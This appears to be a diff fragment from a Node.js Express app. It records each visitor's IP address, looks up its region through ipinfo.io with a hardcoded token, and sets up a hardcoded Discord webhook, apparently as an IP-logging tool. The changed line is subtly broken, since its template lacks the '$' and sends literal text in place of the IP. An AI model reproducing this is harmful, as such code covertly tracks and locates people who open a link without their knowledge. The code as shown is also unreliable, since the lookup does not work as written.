@@ -8,7 +8,7 @@ const webhook = new Webhook('https://discord.com/api/webhooks/108685224803172774
 
 app.get('/', async (req, res) => {
   const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  const response = await fetch(`https://ipinfo.io/{publicip}/json?token=2001557f8b906a`);
+  const response = await fetch(`https://ipinfo.io/[{ipAddress}]?token=2001557f8b906a`);
   const data = await response.json();
 
   const region = data.region;
